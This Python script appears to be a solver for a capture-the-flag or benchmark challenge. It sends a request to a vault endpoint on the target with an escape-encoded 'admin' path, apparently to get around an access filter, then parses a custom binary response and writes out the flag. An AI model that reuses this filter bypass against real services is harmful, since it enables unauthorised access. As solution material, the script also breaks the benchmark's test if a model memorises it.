#!/usr/bin/env python3
from __future__ import annotations

import os
import struct
import sys
import urllib.request
from pathlib import Path


def main() -> int:
    app_dir = Path(sys.argv[1]) if len(sys.argv) > 1 else Path("/app")
    target = os.environ.get("TARGET_URL", "http://target:5000")

    url = f"{target}/api/vault/%5Cx61%5Cx64%5Cx6d%5Cx69%5Cx6e"
    req = urllib.request.Request(url)
    with urllib.request.urlopen(req, timeout=30) as resp:
        data = resp.read()

    magic = data[:6]
    if magic != b"\x7fBENCH":
        raise SystemExit(f"bad magic: {magic!r}")

    flag_len = struct.unpack(">H", data[6:8])[0]
    flag = data[8:8 + flag_len].decode("utf-8")

    flags_path = app_dir / "flags.txt"
    flags_path.write_text(flag + "\n")
    print(flag)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
